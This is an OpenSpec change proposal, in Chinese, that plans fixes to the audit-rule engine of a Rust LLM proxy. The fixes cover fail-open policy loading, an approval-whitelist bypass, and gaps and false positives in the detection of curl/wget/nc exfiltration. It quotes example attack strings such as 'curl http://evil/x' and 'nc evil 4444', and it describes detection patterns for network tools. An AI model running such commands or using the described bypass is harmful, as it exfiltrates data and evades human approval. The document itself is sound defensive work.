## Why

独立六维审查（2026-09-14，审计策略与规则面）确认 9 项偏差（`POL-1`–`POL-9`），其中 1 项 P0 直接违反既有 fail-closed 契约（README §6.11 与 `openspec/specs/audit-rules-parity/spec.md:139` 的 SHALL），2 项 P1 分别造成危险外传漏审与审批门禁绕过：

- **`POL-1`（P0）`AUDIT_POLICY_FILE` 声明 fail-closed，实际 fail-open**：`src/service/audit/policy.rs:42-52` 的 `load_for_runtime` 加载失败仅 warn 并回退 `default_policy()`（全空策略）；策略仅在每请求加载（`src/handler/llm/pump/spawn/setup.rs:25-43`、`src/handler/llm/nonstream.rs:174`），`src/main.rs`（1-201 行）启动序列无任何启动期加载；`load_from_file` 的 `VeilError::Config` 分支实际为死路径（仅单测触发）。契约原文（`openspec/specs/audit-rules-parity/spec.md:139`）要求「不可读、含未知键、孤立列表项或非法 `mode` 时 SHALL 拒启动」，现网却在损坏策略下静默以空策略继续，降级为「无审计」。
- **`POL-6`（P1）内建危险规则缺裸 `curl`/`wget` 外传**：`src/service/audit/rules.rs:54-55,66-75,291-303` 中 `curl`/`wget` 仅在管道进 shell 或携带 `--data`/`-d`/`--post-data` 时命中，裸 `curl http://evil/x`（GET 外传）不命中；Python 对照 `_audit.py:522-526` 第 8 条以 `(curl|wget|nc|ncat|telnet|ssh)` + URL/输出重定向形态覆盖。
- **`POL-7`（P2）`is_exfiltration` 裸子串 `"nc "` 误报**：`rules.rs:300` 的 `lower.contains("nc ")` 命中 `sync ` / `async `（子串含 `nc `），误报良性命令。
- **`POL-8`（P2）`touches_sensitive_path` 不区分读写**：`rules.rs:114-117,248-267` 对任何触及敏感前缀的路径 token 一律判「敏感路径写入」，`ls /etc/passwd` 之类只读命令被拦；Python 对照 `_audit.py:516-520` 的敏感路径规则仅限 `(write_file|patch|echo|cat|tee|cp|mv)` 等写入口。
- **`POL-2`（P2）策略文件 `mode` 键只校验不生效**：`policy.rs:187-198` 解析并校验 `mode`，但 `AuditPolicy` 结构（`policy.rs:10-27`）无 `mode` 字段、运行时从不读取，属静默失效陷阱。
- **`POL-3`（P2）自定义规则文件缺 1MB 上限**：`src/config/custom_file.rs:42-90` 的 `load_custom_file` 直接 `read_to_string` 无大小门禁；Python `_pii.py:120-121` 明确以 `st.st_size > 1_048_576` 拒绝。
- **`POL-4`（P2）审计日志创建存在短暂宽权限窗**：`src/service/audit/log.rs:466-472` 先 `OpenOptions::create(true)` 打开、写入后再 `set_permissions(0o600)`，创建瞬间权限过宽。
- **`POL-5`（P2）空白名单使所有 reaction 被忽略**：`src/service/matrix/branch.rs:54-56` 的 `is_mxid_allowed` 在空白名单下恒返回 false，导致 `src/service/matrix/approval.rs:110-113,173-176` 忽略全部 reaction；Python 对照 `_matrix.py:235,254` 为 `if self.approval_whitelist and sender not in ...`（空白名单＝不过滤）。
- **`POL-9`（P1）文件 `mode: approve` 绕过空白名单启动门禁（`POL-2`×`POL-5` 交互）**：`src/config/env_parse.rs:466` 的 `audit_mode` 仅由 `AUDIT_MODE` 环境变量计算，`:485-491` 的「`approve` + 空白名单拒启动」门禁只作用于该 env 值；`src/main.rs:58` 的 `preflight_whitelist` 仅校验 MXID 形态、不校验名单是否为空。`POL-2` 使策略文件 `mode` 生效（优先级 env 显式——含 `AUDIT_ENABLED` 回退——> 文件 > off，且生效模式注入运行时配置）、`POL-1` 在启动期加载文件、`POL-5` 使空白名单＝不过滤，三者组合产生绕过面：`AUDIT_MODE` 未设置 + 策略文件 `mode: approve` + 空 `APPROVAL_WHITELIST` 时门禁不触发，生效模式为 `approve` 且白名单不过滤 → 任意 reaction 可批准审计决策。修复方向：空白名单门禁 SHALL 按**最终生效模式**（`POL-2` 口径）在策略加载/模式解析边界复用 env 同款检查，来源为文件时同样拒启动。

真相源为上述 `src/` 文件、README §6.11 与 canonical `openspec/specs/audit-rules-parity/spec.md:139,151-154`。本 change 只规划修复（proposal/design/spec/tasks），不改 `src/`、`tests/`、README 与 `scripts/`；实现与文档同步留待 apply 阶段。

引用规范：README §6.11「审计策略文件 fail-closed」；`openspec/specs/audit-rules-parity/spec.md`（策略兼容 SHALL 与 fail-closed Scenario）；Python 对照仓 `credential-proxy` `_audit.py`/`_pii.py`/`_matrix.py`。

## What Changes

- **`POL-1` 启动期 fail-fast 加载并注入共享实例**：`src/main.rs` 启动序列（白名单门禁同批、TPM/sqlite 之前）显式调用 fail-closed 加载器，把 `AUDIT_POLICY_FILE` 解析为 `AuditPolicy` 并注入 `AppState`；`load_for_runtime` 的「失败→warn+默认策略」改为返回 `Result`/或新增 `load_startup` fail-fast 入口；错误分类（不可读／未知键／孤立列表项／非法 `mode`／行无法解析）全部拒启动并带行号；`spawn.rs:99`、`nonstream.rs:174` 改为复用已注入实例，消除每请求读盘与每请求全量 env 快照（`capture_process_env` 仅启动期一次）。回归：损坏策略→启动失败（非静默空策略）；合法策略→deny/allow/extra_dangerous 生效。
- **`POL-6` 补裸 `curl`/`wget` 外传规则**：`rules.rs` 危险规则新增 GET 外泄形态（`curl`/`wget` + URL/输出重定向，词边界），并纳入 `is_exfiltration`；保持误报可控（词边界 + 仅 URL/外发目标形态）；回归：`curl http://evil/x` 命中、`sync`/普通文件名不误报。
- **`POL-7` `nc` 命令词边界匹配**：`rules.rs:300` 的 `lower.contains("nc ")` 改为命令 token 判定（复用 `is_command_word`/`word_after_command` 语义），保留 `nc -l`、`nc evil 4444` 命中；回归：`sync`/`async` 不命中、`nc -l` 命中。
- **`POL-8` 敏感路径读写分流**：`touches_sensitive_path` 拆为「写入口判定」与「敏感路径判定」两步（写命令名单 + 重定向 + 写工具名），只读命令（`ls`/`cat`/`grep` 等）不再拦；对照 Python `_audit.py:516-520` 写入口集合；回归：`ls /etc/passwd` 放行、`cp x /etc/passwd`/`> /etc/passwd` 拦截。
- **`POL-2` 策略 `mode` 生效**：`AuditPolicy` 新增 `mode: Option<AuditMode>` 字段并在解析时写入；启动期计算**最终生效模式**——env 显式（`AUDIT_MODE` 非空，或 `AUDIT_MODE` 缺失/空白时 `AUDIT_ENABLED` 真值回退推导的 `block`）优先，文件 `mode` 仅在 env 未给出审计模式时回退，最后默认 `off`，冲突记 warn（不静默、不静默覆盖）；生效模式须**注入运行时配置**（`src/handler/llm/dispatch.rs:165` 读 `state.config.audit_mode`），否则文件 `mode` 永不生效；回归：文件 `mode` 生效、env 显式（含 `AUDIT_ENABLED` 回退）覆盖文件、不同 `mode` 产生对应运行行为。
- **`POL-3` 自定义规则文件 1MB 上限**：`custom_file.rs::load_custom_file` 读取前以 metadata 判长，`>1_048_576` 字节拒绝并带变量名/实际字节报错（沿用 fail-closed）；回归：超限拒绝、正常文件可用、上限边界（恰好 1MB）放行。
- **`POL-4` 日志文件创建即 0600**：`log.rs::append_line` 用 `OpenOptionsExt::mode(0o600)`（或安全 umask 路径）在 `open` 时即定权限，去掉事后 `set_permissions`；回归：新建日志文件权限即时为 `0o600`。
- **`POL-5` 空白名单语义对齐 Python**：`is_mxid_allowed` 改为「空白名单＝不过滤」（`whitelist.is_empty() || contains`），并记录该语义与 `verdict.rs`/`env_parse.rs` 的 approve 空名单启动门禁的关系（审计 approve 空名单已在启动期拒绝，故不放松审计安全面）；回归：空白名单下 reaction 落定、非空名单下非成员仍被忽略。
- **`POL-9` 生效模式口径的空白名单门禁**：把 `env_parse.rs:485-491` 的「`approve` + 空白名单 → 拒启动」抽为可复用校验，在启动期（`POL-1` 加载策略、`POL-2` 解析生效模式之后）按**合并后的最终生效模式**（D2 口径：env 显式——含 `AUDIT_ENABLED` 回退——> 文件 > 默认 off，而非未经文件 `mode` 合并的裸 env 值）重新执行；文件来源（或任何非 env 来源）解析为 `approve` 且 `APPROVAL_WHITELIST` 为空时同样以 `VeilError::Config` 拒启动，不因来源不同而放松。回归：env 未设＋文件 `mode: approve`＋空白名单→拒启动；同场景白名单非空→以 `approve` 启动；env 路径既有门禁不回退。
- **文档同步**：README §6.11 明确「启动期加载＋`mode` 生效口径」（如行为口径变化）；canonical `audit-rules-parity` spec 的引用一致性核对；新增 spec `audit-policy-enforcement` 为契约真相源。

## Capabilities

### New Capabilities

- `audit-policy-enforcement`：审计策略强制契约——启动期 fail-fast 加载与共享注入（错误分类全部拒启动）、策略 `mode` 生效与优先级、生效模式口径的空白名单启动门禁（含文件来源 `approve`）、自定义规则文件 1MB 上限、审计日志创建即 `0600`、审批白名单空语义、内建危险规则裸 `curl`/`wget` 外传覆盖、`nc` 词边界、敏感路径读写分流。

### Modified Capabilities

- 无。本 change 新增 capability；canonical `openspec/specs/audit-rules-parity/spec.md` 的既有 SHALL（fail-closed 策略兼容）在本 change 为**被强制执行**而非改写，spec 文本差异在归档时随 canonical 修订同步；行为类规则（`POL-6`–`POL-8`）的契约由新 spec 承载。不新增 MODIFIED delta。

## 发现覆盖表（ID → 严重度 → 修复要点 → task）

| ID | 严重度 | 修复要点 | task |
|:---|:-------|:---------|:-----|
| `POL-1` | P0 | 启动期 fail-fast 加载注入 `AppState`；错误分类全部拒启动；请求期复用实例、去每请求读盘/env 快照；损坏/合法两向回归 | 1.1、1.2、1.3、1.4 |
| `POL-2` | P2 | `AuditPolicy.mode` 字段 + 生效优先级（env 显式含 `AUDIT_ENABLED` 回退 > 文件 > 默认 off）+ 生效模式注入运行时配置；mode 差异行为回归 | 6.1、6.2、6.3 |
| `POL-3` | P2 | `load_custom_file` 读取前 1MB 门禁、超限拒绝；边界回归 | 7.1、7.2 |
| `POL-4` | P2 | `append_line` 创建即 `0600`（`OpenOptionsExt::mode`），去掉事后 chmod；权限即时回归 | 8.1、8.2 |
| `POL-5` | P2 | `is_mxid_allowed` 空白名单＝不过滤（对标 Python）；非成员仍忽略；空名单落定回归 | 5.1、5.2 |
| `POL-6` | P1 | 内建规则补裸 `curl`/`wget` 外传（词边界）；外传命中、良性不误报回归 | 2.1、2.2 |
| `POL-7` | P2 | `is_exfiltration` 的 `"nc "` 改命令词边界；`sync`/`async` 不误报、`nc -l` 命中回归 | 3.1、3.2 |
| `POL-8` | P2 | 敏感路径读写分流（写入口集合）；只读放行/写入拦截回归 | 4.1、4.2 |
| `POL-9` | P1 | `POL-2`×`POL-5` 交互：生效模式为 `approve`（含文件来源）＋空白名单须复用 env 门禁拒启动；门禁改为按最终生效模式判定，env/文件两来源回归 | 9.1、9.2、9.3 |

## Non-Goals（显式）

- **规划专属**：本 change 只交付规划 artifacts（proposal/design/spec/tasks），SHALL NOT 修改 `src/`、`tests/`、`README.md`、`scripts/` 或其它 change 目录；不提交 git commit；实现与文档同步留待 apply 阶段。
- **不改审计 verdict 判定内核**：不碰 `is_dangerous`→`evaluate_inner` 单核结构、`AuditHold` 容量记账与脱敏 recognizer 集合；`POL-6`–`POL-8` 只增补/修正规则判定，不改 verdict 出口。
- **不引入新依赖**：仅既有 `serde_json`、`std`（`OpenOptionsExt`/`PermissionsExt`）与测试设施；策略解析仍用极简 YAML 子集。
- **不做热重载**：策略文件仍为「改配置重启生效」（`src/service/audit.rs` 模块声明）。
- **不恢复 Python 的 fail-open 行为**：`POL-1` 只向 fail-closed 收紧，不引入「解析失败禁用审计继续」路径。
- **外部仓缺口不在范围**：Python 原仓自身测试质量问题不在本 change 实施。

## Impact

- **新增文件**：`openspec/changes/veil-audit-policy-enforcement/proposal.md`、`design.md`、`specs/audit-policy-enforcement/spec.md`、`tasks.md`（`.openspec.yaml` 已脚手架在位）。
- **apply 阶段改动面**：`src/main.rs`（启动期策略加载注入 + `POL-9` 生效模式空白名单门禁调用点）、`src/state.rs`（`AppState` 承载已加载 `AuditPolicy`/`Arc`）、`src/service/audit/policy.rs`（fail-fast 加载器 + `mode` 字段）、`src/config/env_parse.rs`（`POL-9` 抽出可复用的空白名单门禁校验）、`src/service/audit/rules.rs`（`POL-6`/`POL-7`/`POL-8`）、`src/config/custom_file.rs`（`POL-3` 1MB 门禁）、`src/service/audit/log.rs`（`POL-4` 创建即 0600）、`src/service/matrix/branch.rs`（`POL-5`）、`src/handler/llm/pump/spawn.rs` 与 `src/handler/llm/nonstream.rs`（改为复用注入实例）、`src/handler/llm/dispatch.rs`（`POL-2` 生效模式注入的请求路径读取点 `state.config.audit_mode`）、对应单测/集成测试、`README.md` §6.11。
- **影响系统**：审计策略启动门禁与加载路径、策略 `mode` 语义、危险规则覆盖面与误报率、审计日志文件权限、审批 reaction 白名单语义、自定义 PII 文件加载上限。
- **依赖**：无新依赖；仅既有 `serde_json`、`std`、`tracing` 与测试设施。
